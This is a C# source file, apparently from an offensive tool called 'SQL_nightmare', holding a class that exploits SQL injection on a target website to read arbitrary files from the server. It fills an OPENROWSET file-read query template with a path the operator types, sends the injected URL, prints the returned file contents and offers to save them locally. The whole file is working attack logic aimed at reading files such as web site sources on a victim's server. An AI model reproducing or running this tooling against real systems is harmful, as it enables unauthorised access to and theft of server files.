using System;
using System.Collections.Generic;
using System.Text;

namespace SQL_nightmare
{
    class ReadFile
    {
        public static void Read(string url)
        {
            string URLForReadingFile = QueryCrafter.constructQueryForSelectObject(url, QueriesDB.ReadFileOpenRowSetQuery);
            string UserChoice = "z";
            while (UserChoice != "x")
            {
                UserChoice = UserInteraction.takeInputString("Press x to exit..\nEnter full/root path for file to read.. eg. E:\\inetpub\\site\\somefile.ext ..");
                if (UserChoice != "x")
                {
                    string FinalFileReadURL = URLForReadingFile.Replace("[FILENAME]", UserChoice);
                    var response = HTTPMethods.getResponse(FinalFileReadURL);
                    if (response != null)
                    {
                        response = ResponseFilter.getPureResponseWithLastIndex(response);
                        if (response != null)
                        {
                            Log.logOutput("--- [File Contents Start]  ---");
                            Log.logOutput(response);
                            Log.logOutput("--- [File Cotents End] ---");

                            UserChoice = UserInteraction.takeInputString("Press s to save File Or Enter to Ignore..");

                            if (UserChoice == "s")
                                SaveFile(response);

                            UserChoice = "z";

                        }
                        else
                            Log.logError("Either File is empty or you 've no right to read that File..");
                    }
                }
            }
        }

        public static void SaveFile(string fileContents)
        {
            string fileName = UserInteraction.takeInputForTableFileGeneration();
            
            FileIO.createWriteFile(fileContents, fileName);

            Log.logOutput("File saved with name : " + fileName);
        }

        public static string ReadFileDirect(string url, string fileName)
        {
            string URLForReadingFile = QueryCrafter.constructQueryForSelectObject(url, QueriesDB.ReadFileOpenRowSetQuery);

            string FinalFileReadURL = URLForReadingFile.Replace("[FILENAME]", fileName);

            var response = HTTPMethods.getResponse(FinalFileReadURL);
            
            if (response != null)
            {
                response = ResponseFilter.getPureResponseWithLastIndex(response);
                if (response != null)
                {
                    response = response.Replace(" ", "");
                    return response;
                }
                else
                    return null;
            }
            else
                return null;
        }
    }
}
